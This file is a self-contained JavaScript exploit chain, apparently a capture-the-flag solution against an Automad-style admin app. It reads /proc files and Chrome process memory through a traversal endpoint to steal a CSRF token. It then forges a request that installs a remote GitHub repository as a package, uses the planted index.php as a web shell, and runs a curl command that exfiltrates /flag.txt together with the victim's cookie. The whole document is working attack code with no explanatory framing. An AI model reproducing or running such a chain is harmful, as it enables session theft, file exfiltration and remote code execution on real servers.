(async()=>{
const REPO={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
const SHELL='http://admin-app/packages/2ash1/static/index.php';
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(t.replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const r=async p=>{
 try{
  let ac=new AbortController();
  let tm=setTimeout(()=>ac.abort(),1200);
  let x=await fetch('/profile'+p+'%3f',{cache:'no-store',signal:ac.signal});
  let t=await x.text();
  clearTimeout(tm);
  return [x.status,t];
 }catch(e){return [0,'']}
};
const rt=async p=>(await r(p))[1];
const cmd=()=>{
 let ck=document.cookie.split(';')[0];
 return `curl -s -X POST http://app/edit -H "Cookie: ${ck}" --data title=flag --data-urlencode content="$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')"`;
};
const install=csrf=>{
 post('csrf '+csrf.slice(0,16));
 let w=open('about:blank','amcsrf');
 let f=document.createElement('form');
 f.method='POST';
 f.action='http://admin-app/_api/package-manager/add-repository';
 f.target='amcsrf';
 let a=(k,v)=>{let i=document.createElement('input');i.name=k;i.value=v;f.appendChild(i)};
 a('__csrf__',csrf);
 a('__json__',JSON.stringify(REPO));
 document.body.appendChild(f);
 f.submit();
 setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},25000);
};
post('stage start');
for(let pid=1;pid<900;pid++){
 let c=await rt('/proc/'+pid+'/cmdline');
  if(!/chrome|chromium/i.test(c))continue;
 post('pid '+pid);
 let mr=await r('/proc/'+pid+'/maps');
 post('maps '+mr[0]+' '+mr[1].length);
 if(mr[0]!=200||mr[1].length<10)continue;
 let m=mr[1];
 let regs=[];
 for(let line of m.split('\n')){
  let q=line.split(/\s+/),x=q[0],perm=q[1]||'',name=q[5]||'';
  if(!x||!perm.includes('r')||!perm.includes('w'))continue;
  if(name&&name!='[heap]'&&!name.includes('/dev/shm'))continue;
  let [s,e]=x.split('-').map(v=>parseInt(v,16));
  if(!s||!e||e<=s)continue;
  let sz=e-s;
  if(sz>0x4000000)continue;
  regs.push({s,e,sz,name});
 }
 regs.sort((a,b)=>(a.name=='[heap]'?-1:0)-(b.name=='[heap]'?-1:0)||a.sz-b.sz);
 post('regions '+regs.length);
 let scanned=0;
 for(let g of regs){
  let step=g.sz>0x400000?0x8000:0x2000;
  let [st,probe]=await r('/proc/'+pid+'/mem?offset=0x'+g.s.toString(16)+'&limit=64');
  if(st!=200)continue;
  for(let off=g.s;off<g.e;off+=step){
   scanned++;
   if(scanned%200==0)post('scan '+scanned);
   if(scanned>900){post('scan limit');break}
   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=1500');
   if(d.includes('csrf')||d.includes('csrfToken')||d.includes('Automad')){
    let z=d.match(/[a-f0-9]{64}/);
    if(z){install(z[0]);return}
   }
  }
  if(scanned>900)break;
 }
}
post('csrf not found');
})();
